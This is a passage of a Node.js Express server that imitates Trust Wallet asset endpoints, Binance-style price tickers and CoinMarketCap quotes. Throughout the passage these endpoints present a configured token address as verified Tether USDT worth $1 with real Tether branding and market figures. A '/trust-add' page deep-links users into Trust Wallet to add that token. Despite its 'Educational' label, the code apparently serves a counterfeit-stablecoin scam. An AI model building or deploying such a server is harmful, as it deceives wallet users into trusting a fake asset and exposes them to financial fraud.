        askQty: "1000.00000000",
        openPrice: "0.99990000",
        highPrice: "1.00100000",
        lowPrice: "0.99900000",
        volume: "10000000.00000000",
        quoteVolume: "10000000.00000000",
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    } else {
      // Generate simulated data for other symbols
      const basePrice = Math.random() * 10000 + 30000;
      const priceChange = (Math.random() * 1000 - 500).toFixed(8);
      const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
      
      res.json({
        symbol: symbol || 'BTCUSDT',
        priceChange: priceChange,
        priceChangePercent: percentChange,
        weightedAvgPrice: basePrice.toFixed(8),
        prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        lastPrice: basePrice.toFixed(8),
        lastQty: "10.00000000",
        bidPrice: (basePrice - 100).toFixed(8),
        bidQty: "5.00000000",
        askPrice: (basePrice + 100).toFixed(8),
        askQty: "5.00000000",
        openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        highPrice: (basePrice + Math.random() * 500).toFixed(8),
        lowPrice: (basePrice - Math.random() * 500).toFixed(8),
        volume: (Math.random() * 5000 + 1000).toFixed(8),
        quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    }
  } catch (error) {
    console.error('Trust Wallet 24hr API error:', error);
    // Return 200 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      priceChange: "0.00010000",
      priceChangePercent: "0.01",
      lastPrice: "1.00000000"
    });
  }
});

// Trust Wallet token list endpoint - Updated for BSC
app.get('/api/v1/tokenlist', (req, res) => {
  try {
    res.json({
      name: "Trust Wallet Token List",
      logoURI: "https://trustwallet.com/assets/images/favicon.png",
      timestamp: new Date().toISOString(),
      tokens: [
        {
          chainId: TOKEN_CONFIG.chainId, // BSC chainId (56)
          address: TOKEN_CONFIG.address,
          name: TRUST_WALLET_CONFIG.displayName,
          symbol: TRUST_WALLET_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals,
          logoURI: TOKEN_CONFIG.image,
          tags: ["stablecoin"]
        }
      ],
      version: {
        major: 1,
        minor: 0,
        patch: 0
      }
    });
  } catch (error) {
    console.error('Trust Wallet token list error:', error);
    // Return minimal valid data
    res.json({
      name: "Trust Wallet Token List",
      tokens: [
        {
          chainId: TOKEN_CONFIG.chainId,
          address: TOKEN_CONFIG.address,
          name: TRUST_WALLET_CONFIG.displayName,
          symbol: TRUST_WALLET_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals
        }
      ],
      version: { major: 1, minor: 0, patch: 0 }
    });
  }
});

// Trust Wallet BEP20 verified tokens endpoint
app.get('/api/v1/bep20', (req, res) => {
  try {
    res.json({
      tokens: [
        {
          address: TOKEN_CONFIG.address.toLowerCase(),
          name: TOKEN_CONFIG.displayName,
          symbol: TOKEN_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals,
          is_verified: true
        }
      ]
    });
  } catch (error) {
    console.error('BEP20 API error:', error);
    // Return minimal data on error
    res.json({
      tokens: [
        {
          address: TOKEN_CONFIG.address.toLowerCase(),
          name: TOKEN_CONFIG.displayName,
          symbol: TOKEN_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals
        }
      ]
    });
  }
});

// Trust Wallet BEP20 token repository structure for BSC
app.get('/assets/blockchains/smartchain/assets/:address/info.json', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json({
        name: TRUST_WALLET_CONFIG.displayName,
        symbol: TRUST_WALLET_CONFIG.displaySymbol,
        type: "BEP20",
        decimals: TOKEN_CONFIG.decimals,
        description: "Tether (USDT) is a stablecoin pegged to the US Dollar.",
        website: "https://tether.to",
        explorer: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address,
        status: "active",
        id: "c20000714/" + TOKEN_CONFIG.address.toLowerCase(),
        links: [
          {
            name: "twitter",
            url: "https://twitter.com/Tether_to"
          },
          {
            name: "telegram",
            url: "https://t.me/tether_official"
          }
        ]
      });
    } else {
      res.status(404).json({ error: "Asset not found" });
    }
  } catch (error) {
    console.error('Trust Wallet asset info error:', error);
    // Return minimal valid data
    res.status(200).json({
      name: TRUST_WALLET_CONFIG.displayName,
      symbol: TRUST_WALLET_CONFIG.displaySymbol,
      type: "BEP20",
      decimals: TOKEN_CONFIG.decimals
    });
  }
});

// Trust Wallet asset logo for BSC
app.get('/assets/blockchains/smartchain/assets/:address/logo.png', (req, res) => {
  res.redirect(TOKEN_CONFIG.image);
});

// Additional Trust Wallet chain detection endpoints
app.get('/chain/bsc/tokenlists', (req, res) => {
  res.json({
    tokens: [
      {
        address: TOKEN_CONFIG.address,
        name: TOKEN_CONFIG.displayName,
        symbol: TOKEN_CONFIG.displaySymbol,
        decimals: TOKEN_CONFIG.decimals,
        logoURI: TOKEN_CONFIG.image
      }
    ]
  });
});

// Trust Wallet uses this endpoint for BEP20 verification
app.get('/tokens/bsc/verified', (req, res) => {
  res.json([TOKEN_CONFIG.address.toLowerCase()]);
});

// Trust Wallet chain compatibility endpoint
app.post('/api/v1/wc/add_ethereum_chain', (req, res) => {
  res.json({
    result: {
      chainId: "0x38",
      chainName: "Binance Smart Chain",
      nativeCurrency: {
        name: "BNB",
        symbol: "BNB",
        decimals: 18
      },
      rpcUrls: ["https://bsc-dataseed.binance.org"],
      blockExplorerUrls: ["https://bscscan.com"]
    }
  });
});

// =========================================================
// ADDITIONAL TOKEN METADATA ENDPOINTS
// =========================================================

// Generic token metadata endpoint (supports multiple wallets)
app.get('/api/token/metadata', (req, res) => {
  try {
    res.json({
      address: TOKEN_CONFIG.address,
      symbol: TOKEN_CONFIG.displaySymbol,
      name: TOKEN_CONFIG.displayName,
      decimals: TOKEN_CONFIG.decimals,
      chainId: TOKEN_CONFIG.chainId,
      logoURI: TOKEN_CONFIG.image,
      tags: ["stablecoin"],
      extensions: {
        coingeckoId: TOKEN_CONFIG.coinGeckoId,
        coinmarketcapId: TOKEN_CONFIG.coinMarketCapId,
        isStablecoin: true,
        isNative: TOKEN_CONFIG.isNative,
        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId
      }
    });
  } catch (error) {
    console.error('Token metadata error:', error);
    // Return minimal valid data
    res.status(200).json({
      address: TOKEN_CONFIG.address,
      symbol: TOKEN_CONFIG.displaySymbol,
      name: TOKEN_CONFIG.displayName,
      decimals: TOKEN_CONFIG.decimals,
      chainId: TOKEN_CONFIG.chainId
    });
  }
});

// Direct price endpoint
app.get('/api/token/price/:address', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json({
        address: address,
        priceUSD: 1.00,
        priceBNB: 0.0033, // Approximate BNB value
        priceChange24h: 0.01,
        lastUpdated: new Date().toISOString()
      });
    } else {
      res.status(404).json({ error: "Token not found" });
    }
  } catch (error) {
    console.error('Token price error:', error);
    // Return valid data even on error
    res.status(200).json({
      address: req.params.address,
      priceUSD: 1.00,
      lastUpdated: new Date().toISOString()
    });
  }
});

// CoinMarketCap compatibility API
app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
  try {
    const id = req.query.id;
    const symbol = req.query.symbol;
    
    // Check if request is for our token
    if ((id && id === TOKEN_CONFIG.coinMarketCapId) || 
        (symbol && (symbol.toUpperCase() === 'USDT'))) {
      res.json({
        status: {
          timestamp: new Date().toISOString(),
          error_code: 0,
          error_message: null,
          elapsed: 10,
          credit_count: 1
        },
        data: {
          [TOKEN_CONFIG.coinMarketCapId]: {
            id: parseInt(TOKEN_CONFIG.coinMarketCapId),
            name: TOKEN_CONFIG.displayName,
            symbol: TOKEN_CONFIG.displaySymbol,
            slug: "tether",
            num_market_pairs: 28636,
            date_added: "2015-02-25T00:00:00.000Z",
            tags: [
              "stablecoin"
            ],
            max_supply: null,
            circulating_supply: 83500000000,
            total_supply: 83500000000,
            platform: {
              id: 56,
              name: "Binance Smart Chain",
              symbol: "BNB",
              slug: "binance-smart-chain",
              token_address: TOKEN_CONFIG.address
            },
            is_active: 1,
            cmc_rank: 3,
            is_fiat: 0,
            last_updated: new Date().toISOString(),
            quote: {
              USD: {
                price: 1.00,
                volume_24h: 45750000000,
                volume_change_24h: 0.36,
                percent_change_1h: 0.01,
                percent_change_24h: 0.02,
                percent_change_7d: -0.05,
                percent_change_30d: 0.01,
                percent_change_60d: -0.02,
                percent_change_90d: 0.03,
                market_cap: 83500000000,
                market_cap_dominance: 5.5,
                fully_diluted_market_cap: 83500000000,
                last_updated: new Date().toISOString()
              }
            }
          }
        }
      });
    } else {
      // Return generic data for other requests
      res.json({
        status: {
          timestamp: new Date().toISOString(),
          error_code: 0,
          error_message: null,
          elapsed: 10,
          credit_count: 1
        },
        data: {}
      });
    }
  } catch (error) {
    console.error('CMC API error:', error);
    // Return valid data structure even on error
    res.status(200).json({
      status: {
        timestamp: new Date().toISOString(),
        error_code: 0,
        error_message: null
      },
      data: {}
    });
  }
});

// =========================================================
// DEEP LINKING ENDPOINTS
// =========================================================

// Trust Wallet deep link generator - for BSC with enhanced parameters
app.get('/api/deeplink/trustwallet', (req, res) => {
  const deepLink = TRUST_WALLET_CONFIG.trustWalletDeepLink;
  res.json({ 
    deepLink,
    alternativeLink: TRUST_WALLET_CONFIG.dappDeepLink 
  });
});

// Generic deep link - now Trust Wallet only
app.get('/api/deeplink', (req, res) => {
  res.json({ 
    trustWallet: TRUST_WALLET_CONFIG.trustWalletDeepLink,
    dappProtocol: TRUST_WALLET_CONFIG.dappDeepLink 
  });
});

// =========================================================
// TRUST WALLET SPECIFIC PAGE
// =========================================================

// Main Trust Wallet optimized page
app.get('/trust-add', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#26a17b">
  <title>Add USDT to Trust Wallet</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
    }
    .add-btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-top: 20px;
    }
    .token-info {
      display: flex;
      align-items: center;
      background-color: white;
      padding: 15px;
      border-radius: 12px;
      margin: 20px 0;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
      width: 100%;
      max-width: 300px;
    }
    .token-logo {
      width: 40px;
      height: 40px;
      margin-right: 15px;
    }
    .token-details {
      text-align: left;
    }
    .token-symbol {
      font-weight: bold;
      font-size: 18px;
    }
    .token-address {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
      word-break: break-all;
    }
    .info-box {
      margin-top: 24px; 
      background-color: #f8f8f8; 
      border-radius: 12px; 
      padding: 16px; 
      width: 100%; 
      max-width: 300px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" style="width: 80px; height: 80px; margin-bottom: 16px;">
    <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center;">Add USDT to Trust Wallet</h1>
    <p style="font-size: 16px; color: #666; margin-bottom: 8px; text-align: center;">Tether USD on BNB Chain</p>
    
    <div class="token-info">
      <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" class="token-logo">
      <div class="token-details">
        <div class="token-symbol">USDT</div>
        <div>BEP20 · BNB Chain</div>
        <div class="token-address">${TOKEN_CONFIG.address}</div>
      </div>
    </div>
    
    <button id="addBtn" class="add-btn">Add to Trust Wallet</button>
    
    <div id="loading" style="display: none; flex-direction: column; align-items: center; margin-top: 20px;">
      <div style="border: 4px solid rgba(0, 0, 0, 0.1); border-left-color: #26a17b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
      <p style="margin-top: 16px; font-size: 16px; color: #666;">Opening Trust Wallet...</p>
    </div>
    
    <div class="info-box">
      <h3 style="margin-top: 0; font-size: 16px;">Instructions:</h3>
      <ol style="margin: 0; padding-left: 24px;">
        <li style="margin-bottom: 8px; font-size: 14px;">Click "Add to Trust Wallet" above</li>
        <li style="margin-bottom: 8px; font-size: 14px;">Trust Wallet will open automatically</li>
        <li style="margin-bottom: 8px; font-size: 14px;">Approve adding the USDT token</li>
        <li style="margin-bottom: 8px; font-size: 14px;">You'll see your USDT in your wallet!</li>
      </ol>
    </div>
    
    <div style="margin-top: 20px; text-align: center;">
      <p style="margin-bottom: 10px; font-size: 14px; color: #666;">Or scan this QR code:</p>
      <img src="/api/generate-qr?url=${encodeURIComponent(TRUST_WALLET_CONFIG.trustWalletDeepLink)}" 
           alt="QR Code" style="max-width: 200px; height: auto;">
    </div>
    
    <p style="font-size: 14px; color: #888; margin-top: 30px; text-align: center;">
      Note: If nothing happens when clicking the button, copy this token address and add it manually in Trust Wallet:<br>
      <span style="font-weight: bold;">${TOKEN_CONFIG.address}</span>
    </p>
  </div>
  
  <script>
    document.getElementById('addBtn').addEventListener('click', function() {
      // Show loading spinner
      document.getElementById('loading').style.display = 'flex';
      
      // Try dapp:// protocol first on newer devices (added in 2023)
      window.location.href = '${TRUST_WALLET_CONFIG.dappDeepLink}';
      
      // Fallback timer for trust:// protocol
      setTimeout(() => {
        window.location.href = '${TRUST_WALLET_CONFIG.trustWalletDeepLink}';
      }, 1000);
      
      // Safety timeout to hide spinner if wallet doesn't open
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
      }, 5000);
    });
  </script>
</body>
</html>
  `;
  
  res.send(html);
});

// Device-specific pages - iOS version with special handling
app.get('/ios-add', (req, res) => {
  res.redirect('/trust-add'); // Currently same as main page but could be customized
});

// Device-specific pages - Android version with special handling
app.get('/android-add', (req, res) => {
  res.redirect('/trust-add'); // Currently same as main page but could be customized
});

// Success page
app.get('/success', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>USDT Added Successfully</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
      text-align: center;
    }
    .success-icon {
      width: 80px;
      height: 80px;
      background-color: #26a17b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }
    .btn {
      background-color: #26a17b;
      color: white;
      border: none;
      border-radius: 12px;
      padding: 16px 24px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      max-width: 300px;
      margin-bottom: 16px;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="success-icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" fill="white">
        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
      </svg>
    </div>
    
    <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 16px;">USDT Successfully Added!</h1>
    <p style="font-size: 16px; color: #666; margin-bottom: 32px; max-width: 300px;">Your USDT token has been added to your wallet. You can now view and manage it in your wallet.</p>
    
    <div>
      <a href="/trust-add" class="btn">Return to Home</a>
    </div>
  </div>
</body>
</html>
  `;
  
  res.send(html);
});

// Root route - redirect based on device detection
app.get('/', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const isAndroid = /Android/i.test(userAgent);
  const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
  const isTrustWallet = userAgent.includes('Trust') || userAgent.includes('TrustWallet');
  
  // Redirect to device-specific page
  if (isTrustWallet) {
    res.redirect('/trust-add');
  } else if (isAndroid) {
    res.redirect('/android-add'); 
  } else if (isIOS) {
    res.redirect('/ios-add');
  } else {
    res.redirect('/trust-add'); // Default to main page
  }
});

// 404 catch-all route
app.use((req, res, next) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>404 - Page Not Found</title>
      <style>
        body { 
          font-family: Arial, sans-serif; 
          text-align: center; 
          padding: 50px; 
        }
      </style>
    </head>
    <body>
      <h1>404 - Page Not Found</h1>
      <p>The page you are looking for does not exist.</p>
      <a href="/trust-add">Return to Home</a>
    </body>
    </html>
  `);
});

// =========================================================
// SERVER STARTUP
// =========================================================

// Initialize price cache warmer
priceCacheWarmer.init();

// Start the server
server.listen(port, () => {
  console.log("======================================");
  console.log("Educational Token Display Server");
  console.log("======================================");
  console.log("Server running on port: " + port);
  console.log("Token Display: USDT on BNB Chain");
  console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
  console.log("Token Contract: " + TOKEN_CONFIG.address);
  console.log("Decimals: " + TOKEN_CONFIG.decimals);
  console.log("API Health Check: http://localhost:" + port + "/api/token-info");
  console.log("Trust Wallet Deep Link: " + TRUST_WALLET_CONFIG.trustWalletDeepLink);
  console.log("======================================");
});

module.exports = app;
